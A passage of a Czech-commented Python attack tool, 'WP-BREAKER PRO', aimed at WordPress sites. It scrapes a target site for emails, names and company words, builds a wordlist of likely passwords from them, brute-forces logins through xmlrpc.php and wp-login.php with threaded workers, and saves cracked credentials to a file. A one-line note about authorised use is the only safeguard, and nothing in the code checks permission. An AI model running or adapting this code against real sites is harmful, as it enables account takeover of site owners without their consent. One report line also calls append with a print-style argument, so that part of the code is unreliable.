            passwords[p.lower()] = 80
        
        # 3. Z emailů (jména)
        for email in self.context.get("emails", []):
            name_part = email.split("@")[0]
            parts = re.split(r'[._\-]', name_part)
            for part in parts:
                if len(part) > 2:
                    passwords[part.lower()] = 75
                    passwords[part.lower() + "123"] = 70
                    passwords[part.lower() + "!"] = 68
                    passwords[part.capitalize()] = 65
                    passwords[part.capitalize() + "123"] = 62
                    passwords[part.lower() + "2024"] = 60
                    passwords[part.lower() + "2025"] = 60
                    passwords[part.lower() + "2026"] = 60
        
        # 4. Z názvu stránky
        title = self.context.get("title", "")
        if title:
            title_words = re.findall(r'\w+', title.lower())
            for w in title_words[:5]:
                if len(w) > 2:
                    passwords[w] = 85
                    passwords[w + "123"] = 80
                    passwords[w + "!"] = 78
                    passwords[w.capitalize()] = 75
                    passwords[w.capitalize() + "123"] = 72
        
        # 5. Z názvu firmy
        company = self.context.get("company", "")
        if company:
            company_words = re.findall(r'\w+', company.lower())
            for w in company_words[:3]:
                if len(w) > 2:
                    passwords[w] = 88
                    passwords[w + "123"] = 83
                    passwords[w + "!"] = 80
                    passwords[w + "2024"] = 78
                    passwords[w + "2025"] = 78
                    passwords[w + "2026"] = 78
                    passwords[w.capitalize()] = 76
                    passwords[w.capitalize() + "123"] = 74
        
        # 6. Z klíčových slov stránky
        for kw in self.context.get("keywords", [])[:10]:
            if len(kw) > 3:
                passwords[kw.lower()] = 70
                passwords[kw.lower() + "123"] = 65
                passwords[kw.capitalize()] = 62
        
        # 7. Kombinace jméno + rok
        for email in self.context.get("emails", []):
            name = email.split("@")[0].split(".")[0] if "." in email.split("@")[0] else email.split("@")[0]
            if len(name) > 2:
                for year in ["2024", "2025", "2026", "2023", "2022", "2021", "2020"]:
                    passwords[name.lower() + year] = 70
                    passwords[name.capitalize() + year] = 65
                    passwords[name.lower() + "@" + year] = 60
        
        # 8. Leetspeak varianty
        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7', 'l': '1'}
        for base_word in list(passwords.keys())[:30]:
            leet_word = base_word
            for orig, repl in leet_map.items():
                leet_word = leet_word.replace(orig, repl)
            if leet_word != base_word and len(leet_word) > 3:
                passwords[leet_word] = passwords[base_word] + 5
        
        # 9. České specifické
        czech_common = ["heslo", "admin", "spravce", "root", "tajne", "klic", "pristup"]
        for cw in czech_common:
            passwords[cw] = 75
            passwords[cw + "123"] = 70
        
        # 10. Wordpress specifické
        wp_specific = [
            "wp", "wordpress", "wpadmin", "adminwp", "wpadm",
            "wordpress123", "wp2024", "wp2025", "wp2026",
            "wproot", "wpadmin123", "administratorwp"
        ]
        for wpw in wp_specific:
            passwords[wpw] = 72
        
        # Převod na seřazený list podle skóre
        sorted_passwords = sorted(passwords.items(), key=lambda x: x[1], reverse=True)
        
        self.output.success(f"Vygenerováno {len(sorted_passwords)} unikátních hesel")
        self.output.info(f"Top 5: {', '.join([p[0] for p in sorted_passwords[:5]])}")
        
        # Export do souboru
        wordlist_file = f"ai_wordlist_{int(time.time())}.txt"
        try:
            with open(wordlist_file, 'w', encoding='utf-8') as f:
                for pw, _ in sorted_passwords:
                    f.write(pw + "\n")
            self.output.success(f"Wordlist uložen: {wordlist_file}")
            self.output.add_finding("AI Wordlist", f"{len(sorted_passwords)} hesel → {wordlist_file}", "info")
        except Exception as e:
            self.output.error(f"Nelze uložit wordlist: {str(e)}")
            wordlist_file = None
        
        self.output.separator()
        return [p[0] for p in sorted_passwords], wordlist_file


# =============================================================================
# SMART BRUTE FORCER
# =============================================================================

class SmartBruteForcer:
    """Inteligentní brute-force s AI korekcí"""
    
    def __init__(self, target, usernames, passwords, output):
        self.target = target
        self.usernames = usernames if isinstance(usernames, list) else [usernames]
        self.passwords = passwords
        self.output = output
        self.found = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.adaptive_delay = 1.0
        self.captcha_detected = False
        self.rate_limited = False
        self.method = "xmlrpc"
        self.total = 0  # Inicializace
    
    def test_xmlrpc(self, username, password):
        """Test přihlášení přes XML-RPC"""
        xmlrpc_url = self.target.rstrip('/') + "/xmlrpc.php"
        xml_body = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""
        
        try:
            resp = requests.post(
                xmlrpc_url,
                data=xml_body,
                headers={"Content-Type": "text/xml"},
                timeout=8,
                verify=False
            )
            
            if resp.status_code == 200 and "isAdmin" in resp.text:
                return True, "XML-RPC success"
            elif "Incorrect" in resp.text or "incorrect" in resp.text:
                return False, ""
            elif resp.status_code == 403:
                self.rate_limited = True
                return False, "RATE_LIMIT"
            else:
                return False, ""
        except requests.exceptions.ConnectionError:
            return False, "ERROR"
        except requests.exceptions.Timeout:
            return False, "TIMEOUT"
        except Exception:
            return False, "ERROR"
    
    def test_wplogin(self, username, password):
        """Test přihlášení přes wp-login.php"""
        login_url = self.target.rstrip('/') + "/wp-login.php"
        
        try:
            session = requests.Session()
            login_page = session.get(login_url, timeout=8, verify=False)
            soup = BeautifulSoup(login_page.text, 'html.parser')
            
            # Extrakce nonce a hidden fields
            form_data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self.target.rstrip('/') + "/wp-admin/",
                "testcookie": "1"
            }
            
            for hidden in soup.find_all("input", type="hidden"):
                if hidden.get("name"):
                    form_data[hidden["name"]] = hidden.get("value", "")
            
            # CAPTCHA detekce
            if "captcha" in login_page.text.lower() or "recaptcha" in login_page.text.lower():
                self.captcha_detected = True
                return False, "CAPTCHA"
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Referer": login_url,
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            resp = session.post(login_url, data=form_data, headers=headers, 
                               allow_redirects=False, timeout=8, verify=False)
            
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "wp-admin" in location and "reauth" not in location:
                    return True, "wp-login success"
            
            # Rate limit detekce
            if resp.status_code == 429 or resp.status_code == 503:
                self.rate_limited = True
                return False, "RATE_LIMIT"
            
            return False, ""
        except requests.exceptions.ConnectionError:
            return False, "ERROR"
        except requests.exceptions.Timeout:
            return False, "TIMEOUT"
        except Exception:
            return False, "ERROR"
    
    def worker(self, username, password):
        """Worker pro testování jednoho páru"""
        if self.stop_event.is_set():
            return None
        
        with self.lock:
            self.attempts += 1
            attempt = self.attempts
        
        # Test přes zvolenou metodu
        if self.method == "xmlrpc":
            success, status = self.test_xmlrpc(username, password)
        else:
            success, status = self.test_wplogin(username, password)
        
        # Live progress
        if success:
            self.output.brute_force_progress(attempt, self.total, username, password, "✓ SUCCESS!")
            self.stop_event.set()
            with self.lock:
                self.found.append({"username": username, "password": password, "method": self.method})
        elif status == "RATE_LIMIT":
            self.output.brute_force_progress(attempt, self.total, username, password, "⏱ RATE-LIMITED")
            time.sleep(self.adaptive_delay * 3)
            self.adaptive_delay = min(self.adaptive_delay * 1.5, 10)
        elif status == "CAPTCHA":
            self.output.brute_force_progress(attempt, self.total, username, password, "🛡 CAPTCHA!")
        elif status == "TIMEOUT":
            self.output.brute_force_progress(attempt, self.total, username, password, "⏰ TIMEOUT")
        elif status == "ERROR":
            self.output.brute_force_progress(attempt, self.total, username, password, "⚠ ERROR")
        else:
            self.output.brute_force_progress(attempt, self.total, username, password, "")
        
        # Adaptivní zpoždění
        if attempt % 5 == 0:
            time.sleep(self.adaptive_delay)
        
        return success
    
    def brute_force(self):
        """Spustí brute-force útok"""
        self.output.phase("AI BRUTE FORCE - Inteligentní útok")
        
        # Detekce metody
        self.output.info("Testuji dostupné metody přihlášení...")
        
        # Test XML-RPC
        xmlrpc_url = self.target.rstrip('/') + "/xmlrpc.php"
        test_body = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        try:
            test_resp = requests.post(xmlrpc_url, data=test_body,
                                     headers={"Content-Type": "text/xml"},
                                     timeout=5, verify=False)
            if test_resp.status_code == 200 and "methodName" in test_resp.text:
                self.method = "xmlrpc"
                self.output.success("XML-RPC dostupné → použiji XML-RPC (rychlejší)")
            else:
                self.method = "wplogin"
                self.output.info("XML-RPC nedostupné → použiji wp-login.php")
        except Exception:
            self.method = "wplogin"
            self.output.info("XML-RPC selhal → použiji wp-login.php")
        
        # Příprava
        self.total = len(self.usernames) * len(self.passwords)
        self.output.info(f"Cíloví uživatelé: {len(self.usernames)}")
        self.output.info(f"Hesla k testování: {len(self.passwords)}")
        self.output.info(f"Celkem pokusů: {self.total}")
        self.output.info("Startuji brute-force (Ctrl+C pro zastavení)...")
        self.output.separator()
        
        print()  # Nový řádek pro progress bar
        
        try:
            # Pro každé uživatelské jméno zkusíme hesla
            for username in self.usernames:
                if self.stop_event.is_set():
                    break
                
                self.output.info(f"\n  Testuji uživatele: {Fore.CYAN}{username}{Style.RESET_ALL}")
                
                # Použijeme ThreadPoolExecutor pro paralelní testování
                with ThreadPoolExecutor(max_workers=3) as executor:
                    futures = []
                    for password in self.passwords:
                        if self.stop_event.is_set():
                            break
                        futures.append(executor.submit(self.worker, username, password))
                    
                    # Počkáme na dokončení
                    for future in as_completed(futures):
                        if self.stop_event.is_set():
                            break
                        pass
                
                if self.stop_event.is_set():
                    break
                
                # Pokud jsme nenašli heslo ani u jednoho uživatele, zkusíme další
                if not self.found:
                    time.sleep(0.5)
            
            print()  # Nový řádek po progress baru
            self.output.separator()
            
            # Výsledky
            if self.found:
                self.output.success(f"\n  {'=' * 40}")
                self.output.success(f"  🎯 NALEZENO {len(self.found)} PŘIHLÁŠENÍ!")
                self.output.success(f"  {'=' * 40}")
                for f in self.found:
                    self.output.result_line("Uživatel", f["username"], Fore.GREEN)
                    self.output.result_line("Heslo", f["password"], Fore.GREEN)
                    self.output.result_line("Metoda", f["method"], Fore.CYAN)
                self.output.success(f"  {'=' * 40}")
            else:
                self.output.warning("\n  Žádná přihlášení nenalezena")
                if self.rate_limited:
                    self.output.warning("  Důvod: Rate limiting aktivní")
                if self.captcha_detected:
                    self.output.warning("  Důvod: CAPTCHA ochrana detekována")
            
        except KeyboardInterrupt:
            print()
            self.output.warning("\n  Brute-force přerušen uživatelem")
            self.stop_event.set()
        
        except Exception as e:
            self.output.error(f"\n  Chyba brute-force: {str(e)}")
        
        return self.found


# =============================================================================
# AI SELF-CORRECTOR
# =============================================================================

class AISelfCorrector:
    """AI autokorekce - analyzuje chyby a optimalizuje parametry"""
    
    def __init__(self, output):
        self.output = output
        self.errors = []
        self.suggestions = []
    
    def analyze_errors(self, bypass_results, dom_findings, context):
        """Analyzuje nalezené informace a navrhuje korekce"""
        self.output.phase("AI SELF-CORRECTOR - Inteligentní analýza")
        self.output.info("Analyzuji data a hledám optimalizace...")
        
        corrections = []
        
        # Analýza bypass results
        if bypass_results:
            if bypass_results.get("xmlrpc"):
                corrections.append("XML-RPC aktivní → prioritní pro brute-force")
                self.output.success("XML-RPC dostupné → urychlí brute-force")
            if bypass_results.get("debug_log"):
                corrections.append("Debug log → může obsahovat credentials")
                self.output.warning("Debug log → zkontrolovat credentials")
            if bypass_results.get("wp_config_backup"):
                corrections.append("Záloha wp-config → možné DB credentials")
                self.output.error("Záloha wp-config → riziko úniku DB hesel")
            
            # REST API user enum
            if bypass_results.get("rest_api"):
                corrections.append("REST API user enumeration → získat uživatele")
                self.output.success("REST API → možné získat uživatele")
        
        # Analýza DOM
        if dom_findings:
            if dom_findings.get("hidden_inputs"):
                if any("nonce" in str(h).lower() for h in dom_findings["hidden_inputs"]):
                    corrections.append("NONCE tokeny → využít pro CSRF")
                    self.output.info("NONCE tokeny nalezeny → možný CSRF test")
            if dom_findings.get("js_variables"):
                corrections.append("JS proměnné → možné API klíče")
                self.output.warning("JS proměnné → zkontrolovat API klíče")
        
        # Analýza kontextu
        if context:
            if len(context.get("emails", [])) > 0:
                corrections.append(f"Emaily ({len(context['emails'])}) → generování hesel")
                self.output.success(f"{len(context['emails'])} emailů → AI wordlist připraven")
            if len(context.get("users", [])) > 0:
                corrections.append(f"Uživatelé ({len(context['users'])}) → brute-force cíle")
                self.output.success(f"{len(context['users'])} uživatelů → přidáno do brute-force")
        
        # Generování závěrečných doporučení
        self.output.separator()
        self.output.info("AI korekce dokončena")
        self.suggestions = corrections
        return corrections


# =============================================================================
# AI REPORT GENERATOR
# =============================================================================

class AIReportGenerator:
    """Generátor finálního AI reportu"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
    
    def calculate_security_score(self, vulnerabilities):
        """Vypočítá bezpečnostní skóre (A-F)"""
        score = 100
        deductions = {
            "critical": 25,
            "danger": 20,
            "high": 15,
            "warning": 8,
            "medium": 5,
            "low": 2,
            "info": 0
        }
        
        for v in vulnerabilities:
            severity = v.get("severity", "info")
            score -= deductions.get(severity, 0)
        
        score = max(0, score)
        
        if score >= 90:
            grade = "A"
            desc = "VÝBORNÉ - Minimální riziko"
        elif score >= 75:
            grade = "B"
            desc = "DOBRÉ - Nízké riziko"
        elif score >= 55:
            grade = "C"
            desc = "PRŮMĚRNÉ - Střední riziko"
        elif score >= 35:
            grade = "D"
            desc = "ŠPATNÉ - Vysoké riziko"
        else:
            grade = "F"
            desc = "KRITICKÉ - Okamžitá akce vyžadována!"
        
        return score, grade, desc
    
    def generate(self, target_info, vulnerabilities, brute_force_results, recommendations, context):
        """Generuje kompletní AI report"""
        self.output.phase("AI REPORT GENERATOR - Finální zpráva")
        self.output.info("Generuji komplexní bezpečnostní report...")
        
        score, grade, grade_desc = self.calculate_security_score(vulnerabilities)
        
        report = []
        report.append(f"\n{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
        report.append(f"{Fore.RED}{Style.BRIGHT}  🛡 WP-BREAKER PRO v{VERSION} - FINÁLNÍ BEZPEČNOSTNÍ REPORT{Style.RESET_ALL}")
        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
        report.append("")
        
        # SEKCE 1: Target Info
        report.append(f"{Fore.CYAN}┌─{' TARGET INFO ':.^60}┐{Style.RESET_ALL}")
        report.append(f"  ▸ URL: {Fore.WHITE}{self.target}{Style.RESET_ALL}")
        report.append(f"  ▸ Datum: {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y %H:%M')}{Style.RESET_ALL}")
        report.append(f"  ▸ Doba trvání: {Fore.WHITE}{self.output.get_elapsed()}{Style.RESET_ALL}")
        if target_info.get("server"):
            report.append(f"  ▸ Server: {Fore.WHITE}{target_info['server']}{Style.RESET_ALL}")
        if target_info.get("ip"):
            report.append(f"  ▸ IP: {Fore.WHITE}{target_info['ip']}{Style.RESET_ALL}")
        report.append(f"{Fore.CYAN}└{'─' * 62}┘{Style.RESET_ALL}")
        report.append("")
        
        # SEKCE 2: Vulnerability Assessment
        report.append(f"{Fore.YELLOW}┌─{' VULNERABILITY ASSESSMENT ':.^60}┐{Style.RESET_ALL}")
        
        critical = [v for v in vulnerabilities if v.get("severity") in ["critical", "danger"]]
        warnings = [v for v in vulnerabilities if v.get("severity") in ["warning", "high", "medium"]]
        infos = [v for v in vulnerabilities if v.get("severity") == "info"]
        
        if critical:
            report.append(f"  {Fore.RED}{Style.BRIGHT}🔴 KRITICKÉ ({len(critical)}):{Style.RESET_ALL}")
            for v in critical:
                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
        
        if warnings:
            report.append(f"  {Fore.YELLOW}{Style.BRIGHT}🟡 VAROVÁNÍ ({len(warnings)}):{Style.RESET_ALL}")
            for v in warnings[:10]:
                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
        
        if infos:
            report.append(f"  {Fore.CYAN}🔵 INFORMACE ({len(infos)}):{Style.RESET_ALL}")
            for v in infos[:8]:
                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
        
        report.append(f"{Fore.YELLOW}└{'─' * 62}┘{Style.RESET_ALL}")
        report.append("")
        
        # SEKCE 3: Brute Force Results
        report.append(f"{Fore.MAGENTA}┌─{' BRUTE FORCE RESULTS ':.^60}┐{Style.RESET_ALL}")
        if brute_force_results:
            report.append(f"  {Fore.GREEN}{Style.BRIGHT}🎯 NALEZENO {len(brute_force_results)} PŘIHLÁŠENÍ:{Style.RESET_ALL}")
            for r in brute_force_results:
                report.append(f"    ├─ Uživatel: {Fore.GREEN}{r['username']}{Style.RESET_ALL}")
                report.append(f"    ├─ Heslo:   {Fore.GREEN}{r['password']}{Style.RESET_ALL}")
                report.append(f"    └─ Metoda:  {Fore.CYAN}{r['method']}{Style.RESET_ALL}")
                report.append("")
        else:
            report.append(f"  {Fore.RED}✗ Žádná přihlášení nenalezena{Style.RESET_ALL}")
        report.append(f"{Fore.MAGENTA}└{'─' * 62}┘{Style.RESET_ALL}")
        report.append("")
        
        # SEKCE 4: Recommendations
        report.append(f"{Fore.GREEN}┌─{' DOPORUČENÍ ':.^60}┐{Style.RESET_ALL}")
        recommendations_list = [
            "1. Aktualizovat WordPress a všechny pluginy na nejnovější verze",
            "2. Implementovat CAPTCHA na login stránky",
            "3. Používat strong password policy (min. 12 znaků, kombinace)",
            "4. Omezit pokusy o přihlášení (rate limiting)",
            "5. Zakázat XML-RPC, pokud není potřeba",
            "6. Povolit WP_DEBUG_LOG jen v development módu",
            "7. Pravidelně auditovat uživatelské účty",
            "8. Používat dvoufaktorové ověřování (2FA)",
            "9. Odstranit zálohy wp-config.php z veřejných adresářů",
            "10. Implementovat Content Security Policy (CSP)",
            "11. Pravidelně kontrolovat debug log",
            "12. Použít Web Application Firewall (WAF)"
        ]
        for rec in recommendations_list:
            report.append(f"  {rec}")
        report.append(f"{Fore.GREEN}└{'─' * 62}┘{Style.RESET_ALL}")
        report.append("")
        
        # SEKCE 5: Executive Summary
        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
        report.append(f"  📊 BEZPEČNOSTNÍ SKÓRE: {Fore.WHITE}{score}/100 → ", end="")
        
        if grade == "A":
            report.append(f"{Fore.GREEN}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
        elif grade == "B":
            report.append(f"{Fore.BLUE}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
        elif grade == "C":
            report.append(f"{Fore.YELLOW}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
        elif grade == "D":
            report.append(f"{Fore.RED}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
        else:
            report.append(f"{Fore.RED}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
        
        report.append(f"  🎯 Nalezeno: {Fore.RED}{len(critical)} kritických{Style.RESET_ALL}, "
                     f"{Fore.YELLOW}{len(warnings)} varování{Style.RESET_ALL}, "
                     f"{Fore.CYAN}{len(infos)} informací{Style.RESET_ALL}")
        report.append(f"  🔐 Nalezená hesla: {Fore.GREEN}{len(brute_force_results)}{Style.RESET_ALL}")
        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
        report.append(f"\n{Fore.DIM}Report generován: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
        report.append(f"WP-BREAKER PRO v{VERSION} | HackerAI Security Research{Style.RESET_ALL}")
        
        # Výpis reportu
        print("\n".join(report))
        
        # Uložení reportu do souboru
        timestamp = int(time.time())
        report_file = f"wp_report_{timestamp}.txt"
        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                # Odstraníme ANSI escape kódy pro textový soubor
                clean_report = []
                for line in report:
                    # Odstranění ANSI kódů
                    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                    clean_line = ansi_escape.sub('', line)
                    clean_report.append(clean_line)
                f.write('\n'.join(clean_report))
            self.output.success(f"\nReport uložen: {report_file}")
        except Exception as e:
            self.output.error(f"Nelze uložit report: {str(e)}")
        
        # Uložení cracknutých hesel
        if brute_force_results:
            crack_file = f"wp_cracked_{timestamp}.txt"
            try:
                with open(crack_file, 'w', encoding='utf-8') as f:
                    for r in brute_force_results:
                        f.write(f"{r['username']}:{r['password']}\n")
                self.output.success(f"Cracknutá hesla uložena: {crack_file}")
            except Exception as e:
                self.output.error(f"Nelze uložit cracknutá hesla: {str(e)}")
        
        return report, score, grade


# =============================================================================
# MAIN CONTROLLER
# =============================================================================

def print_banner():
    """Vytiskne banner nástroje"""
    print(BANNER)
    print(f"  {Fore.CYAN}{Style.BRIGHT}► Cíl:{Style.RESET_ALL} {Fore.WHITE}{TARGET}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}{Style.BRIGHT}► Verze:{Style.RESET_ALL} {Fore.WHITE}v{VERSION}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}{Style.BRIGHT}► Datum:{Style.RESET_ALL} {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y %H:%M')}{Style.RESET_ALL}")
    print(f"  {Fore.DIM}{'─' * 50}{Style.RESET_ALL}")


def show_menu():
    """Zobrazí interaktivní menu"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{' WP-BREAKER PRO v' + VERSION + ' MENU ':=^55}{Style.RESET_ALL}")
    menu_items = [
        ("1", "FULL SCAN", "Spustí všechny moduly v sekvenci", Fore.RED),
        ("2", "TCP/IP Fingerprint", "Server, WAF, OS, security headers", Fore.BLUE),
        ("3", "AI Brute-Force (XML-RPC)", "Brute-force přes XML-RPC", Fore.YELLOW),
        ("4", "AI Brute-Force (wp-login)", "Brute-force přes wp-login.php", Fore.YELLOW),
        ("5", "Cookie Injection Test", "Analýza a manipulace cookies", Fore.CYAN),
        ("6", "DOM Shadow Analyzer", "Skryté formuláře, credentials, JS", Fore.MAGENTA),
        ("7", "Bypass Researcher", "Alternativní cesty k admin přístupu", Fore.GREEN),
        ("8", "AI Context Scraper", "Emaily, jména, firmy, pluginy", Fore.CYAN),
        ("9", "AI Password Generator", "Generování hesel z kontextu", Fore.MAGENTA),
        ("10", "Generate Report Only", "Vygenerovat report z existujících dat", Fore.BLUE),
        ("0", "Exit", "Ukončit WP-BREAKER PRO", Fore.RED),
    ]
    
    for num, name, desc, color in menu_items:
        print(f"  {Fore.WHITE}[{color}{num}{Fore.WHITE}] {color}{Style.BRIGHT}{name}{Style.RESET_ALL}")
        print(f"      {Fore.DIM}{desc}{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}{'─' * 55}{Style.RESET_ALL}")


def validate_target(url):
    """Validuje a otestuje dostupnost targetu"""
    global TARGET
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    TARGET = url
    
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Testuji připojení k {Fore.WHITE}{TARGET}{Style.RESET_ALL}...")
    
    try:
        resp = requests.get(TARGET, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        if resp.status_code < 500:
            print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} Target dostupný (HTTP {resp.status_code})")
            
            # Detekce WordPress
            wp_indicators = ["/wp-content/", "/wp-includes/", "/wp-json/", "WordPress"]
            is_wp = any(ind in resp.text for ind in wp_indicators)
            if is_wp:
                print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} WordPress detekován!")
            else:
                print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} WordPress nebyl detekován (ale může být za CDN)")
            return True
        else:
            print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Server vrátil chybu: HTTP {resp.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Nelze se připojit k serveru")
        return False
    except requests.exceptions.SSLError:
        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} SSL chyba, zkouším bez SSL verifikace...")
        return True
    except Exception as e:
        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Chyba připojení: {str(e)[:50]}")
        return False


def run_full_scan(target, output):
    """Spustí kompletní sken"""
    output.phase("WP-BREAKER PRO FULL SCAN")
    output.info("Spouštím kompletní bezpečnostní audit...")
    print()
    
    start_time = time.time()
    
    # 1. TCP/IP Fingerprint
    fingerprinter = TcpIpFingerprinter(target, output)
    target_info = fingerprinter.fingerprint()
    
    # 2. AI Context Scraper
    scraper = AIContextScraper(target, output)
    context = scraper.scrape()
    
    # 3. DOM Shadow Analyzer
    dom_analyzer = DOMShadowAnalyzer(target, output)
    dom_findings = dom_analyzer.analyze()
    
    # 4. Cookie Engine
    cookie_engine = CookieEngine(target, output)
    cookie_results = cookie_engine.analyze_cookies()
    
    # 5. Bypass Researcher
    bypass = BypassResearcher(target, output)
    bypass_results = bypass.research()
    
    # 6. AI Self-Corrector
    corrector = AISelfCorrector(output)
    corrections = corrector.analyze_errors(bypass_results, dom_findings, context)
    
    # 7. AI Password Generator
    pwd_gen = AIPasswordGenerator(context, output)
    passwords, wordlist_file = pwd_gen.generate()
    
    # 8. Extrakt uživatelů pro brute-force
    usernames = ["admin"]  # Vždy zkusíme admin
    usernames.extend(context.get("users", []))
    usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
    # Odstranění duplicit
    usernames = list(dict.fromkeys(usernames))
    
    # 9. Brute Force
    bruter = SmartBruteForcer(target, usernames, passwords[:100], output)
    brute_results = bruter.brute_force()
    
    # 10. Sběr všech vulnerabilit
    all_vulnerabilities = output.findings
    
    # 11. Generování reportu
    reporter = AIReportGenerator(target, output)
    report, score, grade = reporter.generate(target_info, all_vulnerabilities, brute_results, corrections, context)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'=' * 55}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ FULL SCAN DOKONČEN za {elapsed:.1f} sekund{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 55}{Style.RESET_ALL}")
    
    return report


# =============================================================================
# VSTUPNÍ BOD
# =============================================================================

def main():
    """Hlavní funkce"""
    global TARGET
    
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(BANNER)
    print(f"  {Fore.WHITE}Vítejte v {Fore.RED}WP-BREAKER PRO v{VERSION}{Style.RESET_ALL}")
    print(f"  {Fore.DIM}HACKER-AI-DRIVEN WordPress Penetration Testing Tool{Style.RESET_ALL}")
    print(f"  {Fore.DIM}Autoři: HackerAI Security Research Team{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}! Používejte pouze na systémy, ke kterým máte oprávnění !{Style.RESET_ALL}")
    print()
    
    # Zadání targetu
    while True:
        print(f"{Fore.CYAN}[?]{Style.RESET_ALL} Zadejte cílovou URL (např. https://example.com): ", end="")
        target_input = input().strip()
        
        if not target_input:
            print(f"  {Fore.RED}[✗]{Style.RESET_ALL} URL nesmí být prázdná!")
            continue
        
        if validate_target(target_input):
            break
        
        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} Chcete přesto pokračovat? (a/n): ", end="")
        if input().strip().lower() != 'a':
            continue
        break
    
    # Inicializace output handleru
    output = LiveOutput()
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_banner()
        show_menu()
        
        print(f"\n  {Fore.CYAN}[?]{Style.RESET_ALL} Zvolte možnost [0-10]: ", end="")
        try:
            choice = input().strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        
        if choice == "0":
            print(f"\n  {Fore.YELLOW}Děkuji za použití WP-BREAKER PRO. Stay ethical! 🔒{Style.RESET_ALL}")
            break
        
        elif choice == "1":
            run_full_scan(TARGET, output)
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "2":
            fp = TcpIpFingerprinter(TARGET, output)
            fp.fingerprint()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "3":
            # Nejprve scraper pro kontext
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            pwd_gen = AIPasswordGenerator(context, output)
            passwords, _ = pwd_gen.generate()
            
            usernames = ["admin"]
            usernames.extend(context.get("users", []))
            usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
            usernames = list(dict.fromkeys(usernames))
            
            bruter = SmartBruteForcer(TARGET, usernames, passwords[:100], output)
            bruter.method = "xmlrpc"
            bruter.brute_force()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "4":
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            pwd_gen = AIPasswordGenerator(context, output)
            passwords, _ = pwd_gen.generate()
            
            usernames = ["admin"]
            usernames.extend(context.get("users", []))
            usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
            usernames = list(dict.fromkeys(usernames))
            
            bruter = SmartBruteForcer(TARGET, usernames, passwords[:100], output)
            bruter.method = "wplogin"
            bruter.brute_force()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "5":
            ce = CookieEngine(TARGET, output)
            ce.analyze_cookies()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "6":
            dom = DOMShadowAnalyzer(TARGET, output)
            dom.analyze()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "7":
            bypass = BypassResearcher(TARGET, output)
            bypass.research()
